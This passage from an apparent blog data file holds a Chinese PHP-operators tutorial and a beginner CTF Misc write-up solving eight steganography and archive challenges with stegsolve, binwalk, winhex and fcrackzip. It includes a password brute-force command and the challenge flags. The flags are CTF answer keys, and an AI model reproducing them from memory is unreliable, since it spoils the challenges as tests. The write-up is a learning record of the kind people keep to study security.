class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a&#x3D;10;</span><br><span class=\"line\">$b&#x3D;2;</span><br><span class=\"line\">$c&#x3D;$a-$b;</span><br><span class=\"line\">echo $c;</span><br></pre></td></tr></table></figure>\n\n<p>   2.取反</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a&#x3D;1;</span><br><span class=\"line\">$b&#x3D;-$a;</span><br><span class=\"line\">echo $b; &#x2F;&#x2F;-1</span><br><span class=\"line\">echo &lt;br  &#x2F;&gt;;</span><br><span class=\"line\">echo  $a;   &#x2F;&#x2F;1</span><br></pre></td></tr></table></figure>\n<p>③ *  乘号</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a&#x3D;3;</span><br><span class=\"line\">$b&#x3D;4;</span><br><span class=\"line\">$c&#x3D;$a*$b;</span><br><span class=\"line\">echo $c;</span><br></pre></td></tr></table></figure>\n<p> 就是简单的乘号。<br> ④  /  除号</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a&#x3D;10;</span><br><span class=\"line\">$b&#x3D;2;</span><br><span class=\"line\">$c&#x3D;$a&#x2F;$b;</span><br><span class=\"line\">echo $c;</span><br></pre></td></tr></table></figure>\n<p> ⑤ –  ，++运算</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">++$a;</span><br><span class=\"line\"> --$a ;</span><br></pre></td></tr></table></figure>\n<p>就是先自增或者自减，让后$a参与运算。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a--;</span><br><span class=\"line\">$a++;</span><br></pre></td></tr></table></figure>\n<p>就是先让$a参与运算，让后进行自增或者自减。</p>\n<p>注意：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a&#x3D;10;</span><br><span class=\"line\">   ++$a;</span><br><span class=\"line\"> echo $a;</span><br></pre></td></tr></table></figure>\n<p>这种情况 <code>++$a</code>与<code>$a++</code>都没有参与数值运算，情况相同，数值相同。</p>\n<p>  <strong>0×02：字符串运算符</strong></p>\n<p>  PHP中的字符串运算符只有一个<code>.</code>,也成为连接运算符。</p>\n<p>   <strong>0×03：赋值运算符</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x3D;，+&#x3D;，*&#x3D;，-&#x3D;，&#x2F;&#x3D;，%&#x3D;，.&#x3D;  等等</span><br></pre></td></tr></table></figure>\n<p>二元运算符：<br>左边的操作数必须是变量，右边的可以是一个表达式，一个值，一个变量等等。</p>\n<p>①=：<br>即赋值（不同于数学里的等于），即将等号右边的值赋给左边的变量。<br>②</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">+&#x3D;：$a+&#x3D;$b;  &#x2F;&#x2F;$a&#x3D;$a+$b;</span><br><span class=\"line\">-&#x3D;:$a-&#x3D;$b;    &#x2F;&#x2F;$a&#x3D;$a-$b;</span><br><span class=\"line\">*&#x3D;:$a*&#x3D;$b;  &#x2F;&#x2F;$a&#x3D;$A*$b;</span><br><span class=\"line\">&#x2F;&#x3D;:$a&#x2F;&#x3D;$b;   &#x2F;&#x2F;$a&#x3D;$S&#x2F;$b;</span><br><span class=\"line\">%&#x3D;:$a%&#x3D;$b;   &#x2F;&#x2F;$a&#x3D;$a%$b;   取余</span><br><span class=\"line\">.&#x3D;:$a&#x3D;$b;    &#x2F;&#x2F;$a&#x3D;$a.$b</span><br></pre></td></tr></table></figure>\n<p>   <strong>0×04：比较运算符</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x3D;&#x3D;，&#x3D;&#x3D;&#x3D;，!&#x3D;, &lt;&gt; , !&#x3D;&#x3D; , &lt; , &gt; , &lt;&#x3D; , &gt;&#x3D;等等</span><br></pre></td></tr></table></figure>\n\n<p>概念：对操作数进行比较，满足条件即为true，否则为false。</p>\n<p>PHP规定：<br>                使用echo输出布尔类型值的时候；<br>                echo true ;  显示结果为1<br>                echo false;  显示为空白<br>如果我们要输出布尔类型值的时候，我们最好使用var_dump()输出的结果更明了！<br>         ①==   （值相等）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a&#x3D;&#x3D;$b;</span><br><span class=\"line\">var_dump（$a&#x3D;&#x3D;$b）</span><br></pre></td></tr></table></figure>\n\n<p>   值相等为true，不相等为false。</p>\n<p>②=== (值相等，类型也要相等)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a&#x3D;11;</span><br><span class=\"line\">$b&#x3D;&#39;11&#39;;</span><br><span class=\"line\">var_dump($a&#x3D;&#x3D;$b);  &#x2F;&#x2F;true</span><br><span class=\"line\">echo &lt;br     &#x2F;&gt;;</span><br><span class=\"line\">var_dump($a&#x3D;&#x3D;&#x3D;$b);    &#x2F;&#x2F;false</span><br></pre></td></tr></table></figure>\n<p>③!=     ,&lt;&gt;(值不相等)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a&#x3D;1;</span><br><span class=\"line\">$b&#x3D;2;</span><br><span class=\"line\">var_dump($a!&#x3D;$b);  &#x2F;&#x2F;true</span><br></pre></td></tr></table></figure>\n<p>④   !==  (不全等)<br>值或类型有一个相等的就可以。 </p>\n<p>⑤&lt; , &gt; , &lt; = , &gt;=  ;<br>这个就是和数学里的一样，没必要细说。<br>     <strong>0×05：逻辑运算符</strong><br>概念;对表达式进行逻辑运算，运算出来的结果是布尔类型的值（trure,false）,要求参与运算的值是布尔类型的，否则会被强制转换让后参与运算。<br>以下值被认为false，其他的值都是被认为true。<br><strong>布尔值false<br>0<br>浮点型0.0<br>空白字符串和字符串0<br>没有成员的数组<br>NULL</strong></p>\n<p>①and  &amp;&amp;    (逻辑与)<br>只有两边同时为true时，最后的结果才为true。</p>\n<p>②or   ||  (逻辑或)<br>两边有一个为true时，最后的输出结果为true。也即是两边同时为false时，才能为false。</p>\n<p>③xor   (逻辑异或)<br>左右两边的值不一样是结果为true，一样时为false。</p>\n<p>④ ！    逻辑非<br>将原表达式的值否定掉，true变成false，false变成true。</p>\n<p><strong>0×06：位运算符</strong></p>\n<p>位运算符用于对操作数中的每一个二进制位进行运算。</p>\n<p><strong>0×07;其他运算符</strong></p>\n<p>①？ ：<br>三元运算符<br>表达式1 ？ 表达式2 ：表达式3；<br>如果表达式1的值为true，则执行表达式2，否则执行表达式3。</p>\n<p>②’  ‘<br>可以把系统的命令放在里面执行！（Windows系统）</p>\n<p>③@<br>屏蔽表达式可能发生的错误！<code>注意：是表达式</code></p>\n<blockquote>\n<p>echo @$b;</p>\n</blockquote>\n<p>④=&gt;  , -&gt;  ,instanceof(先省略)</p>\n<p><strong>0×08：运算符的优先级</strong><br>①【无】递增递减<br>②【右-&gt;左】逻辑非<br>③【左-&gt;右】乘，除，取余<br>④【左】加，减，字符串连接<br>⑤【无】包含大于号，小于号的运算符<br>⑥【无】不包含大于号或者小于号的运算符<br>⑦【左】逻辑与 &amp;&amp;<br>⑧【左】逻辑或 ||<br>⑨【左】？   ：<br>⑩【右】赋值运算符<br>⒒【左】逻辑异或 xor</p>\n<p>圆括号里的可以看成一个整体，并且圆括号可以增加程序的可读性。</p>\n<p>短路问题：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a&#x3D;false;</span><br><span class=\"line\">$b&#x3D;1;</span><br><span class=\"line\">$a &amp;&amp; ++$b;</span><br><span class=\"line\">echo $b;  &#x2F;&#x2F;上面的$b直接被短路掉！并且数值不变！</span><br></pre></td></tr></table></figure>\n\n<p>语言设计者认为：只要有逻辑运算符（逻辑与，逻辑或），那么运算结果就是一个true或者false。整个程序的运行过程就不重要了。</p>\n"},{"title":"暑假第一周练习(一)","date":"2020-07-10T04:56:05.000Z","photos":["https://cdn.jsdelivr.net/gh/yremp/cdn@2.1.5/img/cover/(7).jpg.webp"],"_content":"\n\n\n﻿***目录：\n    0×01 Misc之金三胖\n    0×02 Misc 二维码\n    0×03 Misc N种方法解决 \n    0×04 Misc 大白\n    0×05 Misc 基础破解\n    0×06 Misc 你竟然赶我走\n    0×07 Misc 乌镇峰会种图\n    0×08 Misc LSB***\n\n\n   **0×01金三胖 **\n   下载好附件得到一个 格式为gif 的动图\n   ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200709180630688.gif)\n    从图里可以看到一些红字，然后我们就把GIF文件用stegsolve分割成一帧一帧的图片。\n    ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200709181232252.png)\n    分成了89张图片，然后我们一张一张的看就得到了；\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200709181525654.bmp)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020070918162421.bmp)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200709181636541.bmp)\n得到了flag{he11ohongke}  是11不是ll 哈哈有坑\n\n**0×02 二维码**\n\n下载得到附件是一张二维码\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200709205712426.png)\n扫一下得到 secret is here  我天真的以为flag，果然交了就不对\n\n就没了思路，看了大佬博客，于是乎就用binwalk扫了一下\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200709210229610.png)\n里面有一个zip文件分离出来\n\n>binwalk QR_code.png -e\n\n\n\n得到\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200709210649487.png)\n兴奋了一会但是需要密码；\n接着上装备fcrackzip来暴力破解了`\n\n> fcrackzip -b -c1 -l4 -u 1D7.zip\n\n`![在这里插入图片描述](https://img-blog.csdnimg.cn/2020070921085096.png)\n密码=7639\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200709210937613.png)\n把CTF 换成flag就欧克了！！！\n\n**0×03 N种方法解决**\n\n下载好得到一个exe文件，但是不可以运行，想一下应该是格式问题，拉进winhex看一下\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200710110759519.png)\n一张经过base64加密的图片！\n在线找个解密网站，解密得到\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200710110922603.png)\n扫一下，得到flag！\n\n**0×04 大白**\n\n下载好是一张图片\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200710112021792.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n很明显图片的高度被改了，拉进winhex改一下，就会得到flag！！\n\n\n\n\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200710112205357.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n\n**0×05 Misc 基础破解**\n\n下载是一个zip文件，解压之后是一个rar文件，里面有一个加密的txt文件！\n\n使用暴力破解，得到密码2563，然后得到一串字符`ZmxhZ3s3MDM1NDMwMGE1MTAwYmE3ODA2ODgwNTY2MWI5M2E1Y30=`\n\nbase64解密得到flag！\n\n\n\n**0×06 Misc 你竟然赶我走**\n\n下载是一张图片![在这里插入图片描述](https://img-blog.csdnimg.cn/20200710121814759.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n感觉挺正常的，没啥可改的，没思路就拉进winhex分析一下，滑倒最后的发现了flag。\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200710121944803.png)\n**0×07 Misc 乌镇峰会种图**\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020071012264575.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n题目说了一大堆，拉进winhex一看和上题一样。\n\nxswl\n\n**0×08  LSB**\n附件：\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200710124834510.png)\n隐写题，用stegslove,看了好大一会也没啥东西！不过仔细看发现了一些不同。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200710125007998.png)\n红绿蓝的0通道最上面都被遮住了，应该会有一些东西。\n用data extract 钩住红绿蓝的0通道。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200710125224165.png)\n保存为png的图片，会得到一张二维码，扫一下的到flag。\n","source":"_posts/暑假第一周练习(一).md","raw":"---\ntitle: 暑假第一周练习(一)\ndate: 2020-07-10 12:56:05\ntags: 练习\ncategories: 技术\nphotos: https://cdn.jsdelivr.net/gh/yremp/cdn@2.1.5/img/cover/(7).jpg.webp\n---\n\n\n\n﻿***目录：\n    0×01 Misc之金三胖\n    0×02 Misc 二维码\n    0×03 Misc N种方法解决 \n    0×04 Misc 大白\n    0×05 Misc 基础破解\n    0×06 Misc 你竟然赶我走\n    0×07 Misc 乌镇峰会种图\n    0×08 Misc LSB***\n\n\n   **0×01金三胖 **\n   下载好附件得到一个 格式为gif 的动图\n   ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200709180630688.gif)\n    从图里可以看到一些红字，然后我们就把GIF文件用stegsolve分割成一帧一帧的图片。\n    ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200709181232252.png)\n    分成了89张图片，然后我们一张一张的看就得到了；\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200709181525654.bmp)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020070918162421.bmp)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200709181636541.bmp)\n得到了flag{he11ohongke}  是11不是ll 哈哈有坑\n\n**0×02 二维码**\n\n下载得到附件是一张二维码\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200709205712426.png)\n扫一下得到 secret is here  我天真的以为flag，果然交了就不对\n\n就没了思路，看了大佬博客，于是乎就用binwalk扫了一下\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200709210229610.png)\n里面有一个zip文件分离出来\n\n>binwalk QR_code.png -e\n\n\n\n得到\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200709210649487.png)\n兴奋了一会但是需要密码；\n接着上装备fcrackzip来暴力破解了`\n\n> fcrackzip -b -c1 -l4 -u 1D7.zip\n\n`![在这里插入图片描述](https://img-blog.csdnimg.cn/2020070921085096.png)\n密码=7639\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200709210937613.png)\n把CTF 换成flag就欧克了！！！\n\n**0×03 N种方法解决**\n\n下载好得到一个exe文件，但是不可以运行，想一下应该是格式问题，拉进winhex看一下\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200710110759519.png)\n一张经过base64加密的图片！\n在线找个解密网站，解密得到\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200710110922603.png)\n扫一下，得到flag！\n\n**0×04 大白**\n\n下载好是一张图片\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200710112021792.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n很明显图片的高度被改了，拉进winhex改一下，就会得到flag！！\n\n\n\n\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200710112205357.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n\n**0×05 Misc 基础破解**\n\n下载是一个zip文件，解压之后是一个rar文件，里面有一个加密的txt文件！\n\n使用暴力破解，得到密码2563，然后得到一串字符`ZmxhZ3s3MDM1NDMwMGE1MTAwYmE3ODA2ODgwNTY2MWI5M2E1Y30=`\n\nbase64解密得到flag！\n\n\n\n**0×06 Misc 你竟然赶我走**\n\n下载是一张图片![在这里插入图片描述](https://img-blog.csdnimg.cn/20200710121814759.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n感觉挺正常的，没啥可改的，没思路就拉进winhex分析一下，滑倒最后的发现了flag。\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200710121944803.png)\n**0×07 Misc 乌镇峰会种图**\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020071012264575.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n题目说了一大堆，拉进winhex一看和上题一样。\n\nxswl\n\n**0×08  LSB**\n附件：\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200710124834510.png)\n隐写题，用stegslove,看了好大一会也没啥东西！不过仔细看发现了一些不同。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200710125007998.png)\n红绿蓝的0通道最上面都被遮住了，应该会有一些东西。\n用data extract 钩住红绿蓝的0通道。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200710125224165.png)\n保存为png的图片，会得到一张二维码，扫一下的到flag。\n","slug":"暑假第一周练习(一)","published":1,"updated":"2020-07-11T09:24:00.189Z","comments":1,"layout":"post","link":"","_id":"ckchhpshb00179kq6a3m9cb4t","content":"<p>﻿<strong><em>目录：<br>    0×01 Misc之金三胖<br>    0×02 Misc 二维码<br>    0×03 Misc N种方法解决<br>    0×04 Misc 大白<br>    0×05 Misc 基础破解<br>    0×06 Misc 你竟然赶我走<br>    0×07 Misc 乌镇峰会种图<br>    0×08 Misc LSB</em></strong></p>\n<p>   *<em>0×01金三胖 *</em><br>   下载好附件得到一个 格式为gif 的动图<br>   <img src=\"https://img-blog.csdnimg.cn/20200709180630688.gif\" alt=\"在这里插入图片描述\"><br>    从图里可以看到一些红字，然后我们就把GIF文件用stegsolve分割成一帧一帧的图片。<br>    <img src=\"https://img-blog.csdnimg.cn/20200709181232252.png\" alt=\"在这里插入图片描述\"><br>    分成了89张图片，然后我们一张一张的看就得到了；<br><img src=\"https://img-blog.csdnimg.cn/20200709181525654.bmp\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/2020070918162421.bmp\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/20200709181636541.bmp\" alt=\"在这里插入图片描述\"><br>得到了flag{he11ohongke}  是11不是ll 哈哈有坑</p>\n<p><strong>0×02 二维码</strong></p>\n<p>下载得到附件是一张二维码<br><img src=\"https://img-blog.csdnimg.cn/20200709205712426.png\" alt=\"在这里插入图片描述\"><br>扫一下得到 secret is here  我天真的以为flag，果然交了就不对</p>\n<p>就没了思路，看了大佬博客，于是乎就用binwalk扫了一下<br><img src=\"https://img-blog.csdnimg.cn/20200709210229610.png\" alt=\"在这里插入图片描述\"><br>里面有一个zip文件分离出来</p>\n<blockquote>\n<p>binwalk QR_code.png -e</p>\n</blockquote>\n<p>得到<br><img src=\"https://img-blog.csdnimg.cn/20200709210649487.png\" alt=\"在这里插入图片描述\"><br>兴奋了一会但是需要密码；<br>接着上装备fcrackzip来暴力破解了`</p>\n<blockquote>\n<p>fcrackzip -b -c1 -l4 -u 1D7.zip</p>\n</blockquote>\n<p>`<img src=\"https://img-blog.csdnimg.cn/2020070921085096.png\" alt=\"在这里插入图片描述\"><br>密码=7639</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20200709210937613.png\" alt=\"在这里插入图片描述\"><br>把CTF 换成flag就欧克了！！！</p>\n<p><strong>0×03 N种方法解决</strong></p>\n<p>下载好得到一个exe文件，但是不可以运行，想一下应该是格式问题，拉进winhex看一下<br><img src=\"https://img-blog.csdnimg.cn/20200710110759519.png\" alt=\"在这里插入图片描述\"><br>一张经过base64加密的图片！<br>在线找个解密网站，解密得到<br><img src=\"https://img-blog.csdnimg.cn/20200710110922603.png\" alt=\"在这里插入图片描述\"><br>扫一下，得到flag！</p>\n<p><strong>0×04 大白</strong></p>\n<p>下载好是一张图片<br><img src=\"https://img-blog.csdnimg.cn/20200710112021792.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>很明显图片的高度被改了，拉进winhex改一下，就会得到flag！！</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20200710112205357.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<p><strong>0×05 Misc 基础破解</strong></p>\n<p>下载是一个zip文件，解压之后是一个rar文件，里面有一个加密的txt文件！</p>\n<p>使用暴力破解，得到密码2563，然后得到一串字符<code>ZmxhZ3s3MDM1NDMwMGE1MTAwYmE3ODA2ODgwNTY2MWI5M2E1Y30=</code></p>\n<p>base64解密得到flag！</p>\n<p><strong>0×06 Misc 你竟然赶我走</strong></p>\n<p>下载是一张图片<img src=\"https://img-blog.csdnimg.cn/20200710121814759.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>感觉挺正常的，没啥可改的，没思路就拉进winhex分析一下，滑倒最后的发现了flag。</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20200710121944803.png\" alt=\"在这里插入图片描述\"><br><strong>0×07 Misc 乌镇峰会种图</strong><br><img src=\"https://img-blog.csdnimg.cn/2020071012264575.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>题目说了一大堆，拉进winhex一看和上题一样。</p>\n<p>xswl</p>\n<p><strong>0×08  LSB</strong><br>附件：<br><img src=\"https://img-blog.csdnimg.cn/20200710124834510.png\" alt=\"在这里插入图片描述\"><br>隐写题，用stegslove,看了好大一会也没啥东西！不过仔细看发现了一些不同。<br><img src=\"https://img-blog.csdnimg.cn/20200710125007998.png\" alt=\"在这里插入图片描述\"><br>红绿蓝的0通道最上面都被遮住了，应该会有一些东西。<br>用data extract 钩住红绿蓝的0通道。<br><img src=\"https://img-blog.csdnimg.cn/20200710125224165.png\" alt=\"在这里插入图片描述\"><br>保存为png的图片，会得到一张二维码，扫一下的到flag。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>﻿<strong><em>目录：<br>    0×01 Misc之金三胖<br>    0×02 Misc 二维码<br>    0×03 Misc N种方法解决<br>    0×04 Misc 大白<br>    0×05 Misc 基础破解<br>    0×06 Misc 你竟然赶我走<br>    0×07 Misc 乌镇峰会种图<br>    0×08 Misc LSB</em></strong></p>\n<p>   *<em>0×01金三胖 *</em><br>   下载好附件得到一个 格式为gif 的动图<br>   <img src=\"https://img-blog.csdnimg.cn/20200709180630688.gif\" alt=\"在这里插入图片描述\"><br>    从图里可以看到一些红字，然后我们就把GIF文件用stegsolve分割成一帧一帧的图片。<br>    <img src=\"https://img-blog.csdnimg.cn/20200709181232252.png\" alt=\"在这里插入图片描述\"><br>    分成了89张图片，然后我们一张一张的看就得到了；<br><img src=\"https://img-blog.csdnimg.cn/20200709181525654.bmp\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/2020070918162421.bmp\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/20200709181636541.bmp\" alt=\"在这里插入图片描述\"><br>得到了flag{he11ohongke}  是11不是ll 哈哈有坑</p>\n<p><strong>0×02 二维码</strong></p>\n<p>下载得到附件是一张二维码<br><img src=\"https://img-blog.csdnimg.cn/20200709205712426.png\" alt=\"在这里插入图片描述\"><br>扫一下得到 secret is here  我天真的以为flag，果然交了就不对</p>\n<p>就没了思路，看了大佬博客，于是乎就用binwalk扫了一下<br><img src=\"https://img-blog.csdnimg.cn/20200709210229610.png\" alt=\"在这里插入图片描述\"><br>里面有一个zip文件分离出来</p>\n<blockquote>\n<p>binwalk QR_code.png -e</p>\n</blockquote>\n<p>得到<br><img src=\"https://img-blog.csdnimg.cn/20200709210649487.png\" alt=\"在这里插入图片描述\"><br>兴奋了一会但是需要密码；<br>接着上装备fcrackzip来暴力破解了`</p>\n<blockquote>\n<p>fcrackzip -b -c1 -l4 -u 1D7.zip</p>\n</blockquote>\n<p>`<img src=\"https://img-blog.csdnimg.cn/2020070921085096.png\" alt=\"在这里插入图片描述\"><br>密码=7639</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20200709210937613.png\" alt=\"在这里插入图片描述\"><br>把CTF 换成flag就欧克了！！！</p>\n<p><strong>0×03 N种方法解决</strong></p>\n<p>下载好得到一个exe文件，但是不可以运行，想一下应该是格式问题，拉进winhex看一下<br><img src=\"https://img-blog.csdnimg.cn/20200710110759519.png\" alt=\"在这里插入图片描述\"><br>一张经过base64加密的图片！<br>在线找个解密网站，解密得到<br><img src=\"https://img-blog.csdnimg.cn/20200710110922603.png\" alt=\"在这里插入图片描述\"><br>扫一下，得到flag！</p>\n<p><strong>0×04 大白</strong></p>\n<p>下载好是一张图片<br><img src=\"https://img-blog.csdnimg.cn/20200710112021792.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>很明显图片的高度被改了，拉进winhex改一下，就会得到flag！！</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20200710112205357.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<p><strong>0×05 Misc 基础破解</strong></p>\n<p>下载是一个zip文件，解压之后是一个rar文件，里面有一个加密的txt文件！</p>\n<p>使用暴力破解，得到密码2563，然后得到一串字符<code>ZmxhZ3s3MDM1NDMwMGE1MTAwYmE3ODA2ODgwNTY2MWI5M2E1Y30=</code></p>\n<p>base64解密得到flag！</p>\n<p><strong>0×06 Misc 你竟然赶我走</strong></p>\n<p>下载是一张图片<img src=\"https://img-blog.csdnimg.cn/20200710121814759.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>感觉挺正常的，没啥可改的，没思路就拉进winhex分析一下，滑倒最后的发现了flag。</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20200710121944803.png\" alt=\"在这里插入图片描述\"><br><strong>0×07 Misc 乌镇峰会种图</strong><br><img src=\"https://img-blog.csdnimg.cn/2020071012264575.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>题目说了一大堆，拉进winhex一看和上题一样。</p>\n<p>xswl</p>\n<p><strong>0×08  LSB</strong><br>附件：<br><img 